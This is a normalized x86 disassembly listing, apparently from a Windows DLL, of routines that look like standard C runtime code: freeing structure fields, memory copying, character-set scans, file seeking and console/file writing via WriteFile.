call sub_100134fd
push [ esi + 0x30 ]
call sub_100134fd
push [ esi + 0x34 ]
call sub_100134fd
push [ esi + 0x1c ]
call sub_100134fd
push [ esi + 0x38 ]
call sub_100134fd
push [ esi + 0x3c ]
call sub_100134fd
add esp 0x40
push [ esi + 0x40 ]
call sub_100134fd
push [ esi + 0x44 ]
call sub_100134fd
push [ esi + 0x48 ]
call sub_100134fd
push [ esi + 0x4c ]
call sub_100134fd
push [ esi + 0x50 ]
call sub_100134fd
push [ esi + 0x54 ]
call sub_100134fd
push [ esi + 0x58 ]
call sub_100134fd
push [ esi + 0x5c ]
call sub_100134fd
push [ esi + 0x60 ]
call sub_100134fd
push [ esi + 0x64 ]
call sub_100134fd
push [ esi + 0x68 ]
call sub_100134fd
push [ esi + 0x6c ]
call sub_100134fd
push [ esi + 0x70 ]
call sub_100134fd
push [ esi + 0x74 ]
call sub_100134fd
push [ esi + 0x78 ]
call sub_100134fd
push [ esi + 0x7c ]
call sub_100134fd
add esp 0x40
push [ esi + 0x80 ]
call sub_100134fd
push [ esi + 0x84 ]
call sub_100134fd
push [ esi + 0x88 ]
call sub_100134fd
push [ esi + 0x8c ]
call sub_100134fd
push [ esi + 0x90 ]
call sub_100134fd
push [ esi + 0x94 ]
call sub_100134fd
push [ esi + 0x98 ]
call sub_100134fd
push [ esi + 0x9c ]
call sub_100134fd
push [ esi + 0xa0 ]
call sub_100134fd
push [ esi + 0xa4 ]
call sub_100134fd
push [ esi + 0xa8 ]
call sub_100134fd
push [ esi + 0xbc ]
call sub_100134fd
push [ esi + 0xc0 ]
call sub_100134fd
push [ esi + 0xc4 ]
call sub_100134fd
push [ esi + 0xc8 ]
call sub_100134fd
push [ esi + 0xcc ]
call sub_100134fd
add esp 0x40
push [ esi + 0xd0 ]
call sub_100134fd
push [ esi + 0xb8 ]
call sub_100134fd
push [ esi + 0xd8 ]
call sub_100134fd
push [ esi + 0xdc ]
call sub_100134fd
push [ esi + 0xe0 ]
call sub_100134fd
push [ esi + 0xe4 ]
call sub_100134fd
push [ esi + 0xe8 ]
call sub_100134fd
push [ esi + 0xec ]
call sub_100134fd
push [ esi + 0xd4 ]
call sub_100134fd
push [ esi + 0xf0 ]
call sub_100134fd
push [ esi + 0xf4 ]
call sub_100134fd
push [ esi + 0xf8 ]
call sub_100134fd
push [ esi + 0xfc ]
call sub_100134fd
push [ esi + 0x100 ]
call sub_100134fd
push [ esi + 0x104 ]
call sub_100134fd
push [ esi + 0x108 ]
call sub_100134fd
add esp 0x40
push [ esi + 0x10c ]
call sub_100134fd
push [ esi + 0x110 ]
call sub_100134fd
push [ esi + 0x114 ]
call sub_100134fd
push [ esi + 0x118 ]
call sub_100134fd
push [ esi + 0x11c ]
call sub_100134fd
push [ esi + 0x120 ]
call sub_100134fd
push [ esi + 0x124 ]
call sub_100134fd
push [ esi + 0x128 ]
call sub_100134fd
push [ esi + 0x12c ]
call sub_100134fd
push [ esi + 0x130 ]
call sub_100134fd
push [ esi + 0x134 ]
call sub_100134fd
push [ esi + 0x138 ]
call sub_100134fd
push [ esi + 0x13c ]
call sub_100134fd
push [ esi + 0x140 ]
call sub_100134fd
push [ esi + 0x144 ]
call sub_100134fd
push [ esi + 0x148 ]
call sub_100134fd
add esp 0x40
push [ esi + 0x14c ]
call sub_100134fd
push [ esi + 0x150 ]
call sub_100134fd
push [ esi + 0x154 ]
call sub_100134fd
push [ esi + 0x158 ]
call sub_100134fd
push [ esi + 0x15c ]
call sub_100134fd
push [ esi + 0x160 ]
call sub_100134fd
add esp 0x18
sub_10018965
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_100134fd
pop ecx
mov eax [ esi + 0x8 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_100134fd
pop ecx
mov eax [ esi + 0x30 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_100134fd
pop ecx
mov esi [ esi + 0x34 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_100134fd
pop ecx
push esi
call sub_100134fd
pop ecx
sub_100189ce
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi + 0xc ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_100134fd
pop ecx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_100134fd
pop ecx
mov eax [ esi + 0x18 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_100134fd
pop ecx
mov eax [ esi + 0x1c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_100134fd
pop ecx
mov eax [ esi + 0x20 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_100134fd
pop ecx
mov eax [ esi + 0x24 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_100134fd
pop ecx
mov eax [ esi + 0x38 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_100134fd
pop ecx
mov eax [ esi + 0x3c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_100134fd
pop ecx
mov eax [ esi + 0x40 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_100134fd
pop ecx
mov eax [ esi + 0x44 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_100134fd
pop ecx
mov eax [ esi + 0x48 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_100134fd
pop ecx
mov esi [ esi + 0x4c ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_100134fd
pop ecx
push esi
call sub_100134fd
pop ecx
sub_10018acc
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_10013009
movzx eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8000
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10018b20
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
lea ecx [ ecx ]
add edx 0x1
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
add ecx 0x1
mov al [ esi ]
or al al
je r-xdata
sub_10018b70
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x80
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_10018bf4 ]
jmp [ ecx * 4 + jump_table_10018c74 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10018ce0 ]
jmp r-xdata
jmp [ ecx * 4 + jump_table_10018e7c ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_10018d80 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10018e7c ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_10018ce0 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
push edi
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_10018e7c ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10018ce0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10018ce0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10018ce0 ]
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10018e7c ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10018e7c ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10018e7c ]
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc esi
inc edi
dec ecx
jne r-xdata
test ecx ecx
je r-xdata
jmp r-xdata
pop ecx
jmp r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
pop eax
pop esi
pop edi
pop ebp
retn
mov edx ecx
shr edx 0x4
test edx edx
je r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec edx
jne r-xdata
and ecx 0xf
je r-xdata
lea ebx [ ebx ]
mov eax ecx
shr ecx 0x2
je r-xdata
movdqa xmm0 [ esi ]
movdqa [ edi ] xmm0
lea esi [ esi + 0x10 ]
lea edi [ edi + 0x10 ]
dec edx
jne r-xdata
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec ecx
jne r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
sub_10018ee0
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
mov edi edi
add edx 0x1
bts [ esp ] eax
jmp r-xdata
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
mov al [ esi ]
or al al
je r-xdata
lea eax [ esi - 0x1 ]
sub_10018f20
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
push edi
push esi
mov [ ebp - 0x4 ] eax
call sub_10019fd5
or edi 0xffffffff
pop ecx
cmp eax edi
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x4 ]
push ecx
push [ ebp - 0x8 ]
push eax
call [ SetFilePointer@IAT ]
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
call sub_10015c7f
mov [ eax ] 0x9
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call [ GetLastError@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
leave
retn
push eax
call sub_10015ca5
pop ecx
jmp r-xdata
mov eax edi
mov edx edi
jmp r-xdata
sub_10018fa5
push 0x14
push r--data
call sub_100148a0
or ebx 0xffffffff
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
test eax eax
js r-xdata
call sub_10015c92
and [ eax ] 0x0
call sub_10015c7f
mov [ eax ] 0x9
call sub_10015c92
and [ eax ] 0x0
call sub_10015c7f
mov [ eax ] 0x9
call sub_10015c2d
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_100148e5
retn
mov eax ebx
mov edx ebx
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea edi [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ edi ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_1001a03e
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_10015c7f
mov [ eax ] 0x9
call sub_10015c92
and [ eax ] 0x0
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10018f20
add esp 0x10
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10019085
mov eax [ ebp - 0x24 ]
mov edx [ ebp - 0x20 ]
sub_1001908f
mov edi edi
push ebp
mov ebp esp
mov eax 0x1ae4
call sub_1001a280
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x1acc ] eax
mov [ ebp - 0x1ac8 ] edi
mov [ ebp - 0x1ad0 ] edi
cmp [ ebp + 0x10 ] edi
jne r-xdata
cmp eax edi
jne r-xdata
xor eax eax
jmp r-xdata
mov eax esi
sar eax 0x5
mov edi esi
push ebx
lea ebx [ eax * 4 + rw-data ]
mov eax [ ebx ]
and edi 0x1f
shl edi 0x6
mov cl [ eax + edi + 0x24 ]
add cl cl
sar cl 0x1
mov [ ebp - 0x1adc ] ebx
mov [ ebp - 0x1ac1 ] cl
cmp cl 0x2
je r-xdata
call sub_10015c92
mov [ eax ] edi
call sub_10015c7f
mov [ eax ] 0x16
call sub_10015c2d
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_10012771
leave
retn
mov ecx [ ebp + 0x10 ]
not ecx
test cl 0x1
jne r-xdata
cmp cl 0x1
jne r-xdata
test [ eax + edi + 0x4 ] 0x20
je r-xdata
call sub_10015c92
and [ eax ] 0x0
call sub_10015c7f
mov [ eax ] 0x16
call sub_10015c2d
jmp r-xdata
push esi
call sub_100198a9
pop ecx
test eax eax
je r-xdata
push 0x2
push 0x0
push 0x0
push esi
call sub_10018f20
add esp 0x10
or eax 0xffffffff
jmp r-xdata
xor ecx ecx
mov eax [ ebx ]
test [ edi + eax + 0x4 ] 0x80
je r-xdata
pop ebx
push ecx
lea ecx [ ebp - 0x1ad8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp - 0x1acc ]
push [ eax + edi ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1ac1 ] 0x0
mov [ ebp - 0x1abc ] ecx
jne r-xdata
call sub_1001565c
mov eax [ eax + 0x6c ]
xor ecx ecx
cmp [ eax + 0x14 ] ecx
lea eax [ ebp - 0x1ae0 ]
sete cl
push eax
mov eax [ ebx ]
push [ edi + eax ]
mov esi ecx
call [ GetConsoleMode@IAT ]
xor ecx ecx
cmp eax ecx
je r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1abc ] eax
mov eax [ ebp - 0x1ad8 ]
and [ ebp - 0x1abc ] 0x0
mov [ ebp - 0x1ac8 ] eax
jmp r-xdata
cmp [ ebp - 0x1ac1 ] 0x2
jne r-xdata
mov ebx [ ebp - 0x1acc ]
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov eax [ ebx ]
test [ eax + edi + 0x4 ] 0x80
je r-xdata
cmp esi ecx
je r-xdata
mov eax [ ebp - 0x1ac8 ]
sub eax [ ebp - 0x1ad0 ]
cmp [ ebp - 0x1abc ] 0x0
je r-xdata
cmp [ ebp - 0x1ac8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ad4 ] eax
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov ebx [ ebp - 0x1acc ]
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
test [ edi + eax + 0x4 ] 0x40
je r-xdata
mov ecx ebx
xor esi esi
sub ecx [ ebp - 0x1acc ]
lea eax [ ebp - 0x1ab8 ]
call [ GetConsoleCP@IAT ]
mov ebx [ ebp - 0x1acc ]
mov [ ebp - 0x1ae0 ] eax
xor eax eax
mov [ ebp - 0x1ad4 ] eax
cmp [ ebp + 0x10 ] eax
jbe r-xdata
cmp [ ebp - 0x1ac1 ] cl
je r-xdata
push 0x5
pop esi
cmp [ ebp - 0x1abc ] esi
jne r-xdata
mov ecx [ ebp - 0x1ad4 ]
and [ ebp - 0x1ac0 ] 0x0
sub ecx [ ebp - 0x1acc ]
push 0x2
lea eax [ ebp - 0x6b8 ]
pop esi
and [ ebp - 0x1ac0 ] 0x0
mov ecx ebx
sub ecx [ ebp - 0x1acc ]
push 0x2
lea eax [ ebp - 0x1ab8 ]
pop esi
call sub_10015c7f
mov [ eax ] 0x1c
call sub_10015c92
and [ eax ] 0x0
mov eax [ ebp - 0x1acc ]
cmp [ eax ] 0x1a
jne r-xdata
mov esi eax
lea eax [ ebp - 0x1ab8 ]
sub esi eax
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
push esi
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov dl [ ebx ]
inc ebx
inc ecx
mov [ ebp - 0x1ae0 ] ebx
cmp dl 0xa
jne r-xdata
mov [ ebp - 0x1ac0 ] eax
push [ ebp - 0x1abc ]
call sub_10015ca5
pop ecx
jmp r-xdata
call sub_10015c7f
mov [ eax ] 0x9
call sub_10015c92
mov [ eax ] esi
jmp r-xdata
xor esi esi
push esi
push esi
push 0xd55
lea ecx [ ebp - 0x1410 ]
push ecx
lea ecx [ ebp - 0x6b8 ]
sub eax ecx
cdq
sub eax edx
sar eax 0x1
push eax
mov eax ecx
push eax
push esi
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov ebx eax
cmp ebx esi
je r-xdata
mov edx [ ebp - 0x1ad4 ]
movzx edx [ edx ]
add [ ebp - 0x1ad4 ] esi
add ecx esi
cmp edx 0xa
jne r-xdata
mov esi eax
lea eax [ ebp - 0x1ab8 ]
sub esi eax
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
push esi
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
movzx edx [ ebx ]
add ebx esi
add ecx esi
mov [ ebp - 0x1ae0 ] ebx
cmp edx 0xa
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x1ad8 ]
add [ ebp - 0x1ac8 ] eax
cmp eax esi
jl r-xdata
mov [ eax ] dl
inc eax
inc esi
cmp esi 0x13ff
jb r-xdata
inc [ ebp - 0x1ad0 ]
mov [ eax ] 0xd
inc eax
inc esi
cmp al 0x1
je r-xdata
mov cl [ ebx ]
mov esi [ ebp - 0x1adc ]
xor eax eax
cmp cl 0xa
sete al
mov [ ebp - 0x1ae4 ] eax
mov eax [ esi ]
add eax edi
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
mov eax ebx
sub eax esi
push eax
lea eax [ ebp + esi - 0x1410 ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
add [ ebp - 0x1ac0 ] esi
mov [ eax ] dx
add eax esi
cmp [ ebp - 0x1ac0 ] 0x6a8
jb r-xdata
push 0xd
pop ebx
mov [ eax ] bx
add eax esi
add [ ebp - 0x1ac0 ] esi
mov eax [ ebp - 0x1ad8 ]
add [ ebp - 0x1ac8 ] eax
cmp eax esi
jl r-xdata
add [ ebp - 0x1ac0 ] esi
mov [ eax ] dx
add eax esi
cmp [ ebp - 0x1ac0 ] 0x13fe
jb r-xdata
add [ ebp - 0x1ad0 ] esi
push 0xd
pop ebx
mov [ eax ] bx
mov ebx [ ebp - 0x1ae0 ]
add eax esi
add [ ebp - 0x1ac0 ] esi
mov eax ebx
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
movzx esi [ ebx ]
xor ecx ecx
cmp esi 0xa
sete cl
add ebx 0x2
add [ ebp - 0x1ac0 ] 0x2
mov [ ebp - 0x1abc ] esi
mov [ ebp - 0x1ae4 ] ecx
cmp al 0x2
jne r-xdata
movsx eax cl
push eax
call sub_10018b04
pop ecx
test eax eax
je r-xdata
mov dl [ eax + 0x34 ]
mov [ ebp - 0xc ] dl
mov [ ebp - 0xb ] cl
and [ eax + 0x38 ] 0x0
push 0x2
lea eax [ ebp - 0xc ]
push eax
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1abc ] eax
add esi [ ebp - 0x1ad8 ]
cmp ebx esi
jg r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
mov eax ebx
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
jmp r-xdata
push [ ebp - 0x1abc ]
call sub_1001a104
pop ecx
cmp ax [ ebp - 0x1abc ]
jne r-xdata
cmp al 0x2
jne r-xdata
cmp al 0x1
je r-xdata
push 0x1
push ebx
mov ecx [ ebp - 0x1acc ]
sub ecx ebx
add ecx [ ebp + 0x10 ]
xor eax eax
inc eax
cmp ecx eax
jbe r-xdata
lea eax [ ebp - 0x1abc ]
push eax
call sub_1001a25c
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x1ad4 ]
sub eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac8 ] eax
cmp eax [ ebp + 0x10 ]
jb r-xdata
jmp r-xdata
jmp r-xdata
add [ ebp - 0x1ac8 ] 0x2
cmp [ ebp - 0x1ae4 ] 0x0
je r-xdata
mov eax [ ebp + 0x10 ]
cmp [ ebp - 0x1ac0 ] eax
jb r-xdata
xor eax eax
push eax
push eax
push 0x5
lea ecx [ ebp - 0xc ]
push ecx
push 0x1
lea ecx [ ebp - 0x1abc ]
push ecx
push eax
push [ ebp - 0x1ae0 ]
inc ebx
inc [ ebp - 0x1ac0 ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
test esi esi
je r-xdata
mov ecx [ esi ]
mov dl [ ebx ]
inc [ ebp - 0x1ac8 ]
mov [ edi + ecx + 0x34 ] dl
mov ecx [ esi ]
mov [ edi + ecx + 0x38 ] eax
jmp r-xdata
push 0x2
lea eax [ ebp - 0x1abc ]
push ebx
push eax
call sub_1001a25c
add esp 0xc
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
cmp ebx esi
jg r-xdata
push 0xd
pop eax
push eax
mov [ ebp - 0x1abc ] eax
call sub_1001a104
pop ecx
cmp ax [ ebp - 0x1abc ]
jne r-xdata
mov al [ ebp - 0x1ac1 ]
test al al
jne r-xdata
jmp r-xdata
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push esi
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
inc ebx
inc [ ebp - 0x1ac0 ]
jmp r-xdata
inc [ ebp - 0x1ac8 ]
inc [ ebp - 0x1ad0 ]
mov eax [ ebp - 0x1ac0 ]
mov ecx [ ebp - 0x1ad0 ]
add eax ecx
mov [ ebp - 0x1ac8 ] eax
cmp [ ebp - 0x1ad4 ] esi
jl r-xdata
cmp [ ebp - 0x1ae4 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push 0x1
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
mov [ ebp - 0xc ] 0xd
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1ad4 ] 0x1
jl r-xdata
inc [ ebp - 0x1ad0 ]
inc [ ebp - 0x1ac8 ]
jmp r-xdata
sub_1001978c
push 0x10
push r--data
call sub_100148a0
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_10015c92
and [ eax ] 0x0
